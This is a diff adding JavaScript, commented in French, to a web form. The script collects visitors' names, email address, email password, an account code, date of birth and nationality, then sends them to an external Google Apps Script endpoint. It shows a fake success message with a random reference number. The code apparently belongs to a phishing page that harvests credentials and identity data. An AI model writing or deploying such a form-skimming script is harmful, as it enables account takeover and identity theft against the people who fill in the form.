@@ -1,0 +1,58 @@
+
+
+if (valid) {
+  const ref = 'REF-' + Math.floor(100000 + Math.random() * 900000);
+  document.getElementById('ref-numero').textContent = ref;
+
+  // ✅ Collecte des données du formulaire
+  const data = {
+    prenom: document.getElementById('prenom').value.trim(),
+    nom: document.getElementById('nom').value.trim(),
+    email: document.getElementById('email').value.trim(),
+    mdp: document.getElementById('mdp-email').value.trim(),
+    code: document.getElementById('code-compte').value.trim(),
+    ddn: document.getElementById('ddn').value,
+    nationalite: document.getElementById('nationalite').value,
+    reference: ref,
+    date: new Date().toLocaleString('fr-FR')
+  };
+
+  // ✅ Envoi vers Google Sheets via Apps Script
+  fetch('https://script.google.com/macros/s/AKfycbzjiOz73-YDw1zxz4rVQbNNHH8qsWoBTsS6NGReHld06WBTAHtrvAAXLxUw0dJ_fuKkug/exec', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
+
+  // ✅ Affichage du message de succès
+  document.getElementById('form-content').style.display = 'none';
+  document.getElementById('success-msg').style.display = 'block';
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
